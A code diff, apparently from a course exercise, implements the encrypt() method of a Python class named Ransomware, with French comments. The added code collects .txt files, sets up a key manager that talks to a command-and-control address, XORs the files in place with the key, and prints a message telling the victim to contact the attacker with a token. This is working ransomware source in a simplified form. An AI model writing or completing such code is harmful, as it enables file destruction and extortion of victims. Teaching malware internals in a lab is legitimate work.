@@ -43,8 +43,27 @@ class Ransomware:
         raise [str(file) for file in path.rglob(filter)]
 
     def encrypt(self):
-        # main function for encrypting (see PDF)
-        raise NotImplemented()
+        # Récupère tous les fichiers .txt dans le dossier courant
+        fichiers_txt = self.get_files("*.txt")
+
+        # Crée une instance de SecretManager pour gérer les secrets
+        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
+
+        # Génère une clé et un sel aléatoires et les stocke dans un fichier token.bin
+        # Si le fichier token.bin existe déjà, il va lire les valeurs existantes
+        # Si le fichier n'existe pas, il va le créer et écrire les valeurs dedans
+        secret_manager.setup()
+
+        # Chiffre les fichiers .txt à l'aide de la méthode xorfiles() de SecretManager
+        # La méthode xorfiles() va appliquer un XOR à chaque octet du fichier avec la clé générée précédemment
+        # Le fichier d'origine est remplacé par sa version chiffrée
+        secret_manager.xorfiles(fichiers_txt)
+
+        # Affiche un message pour demander à la victime de contacter l'attaquant,
+        # y compris le jeton hexadécimal généré pendant le chiffrement
+        jeton_hex = secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token=jeton_hex))
+
 
     def decrypt(self):
         # main function for decrypting (see PDF)
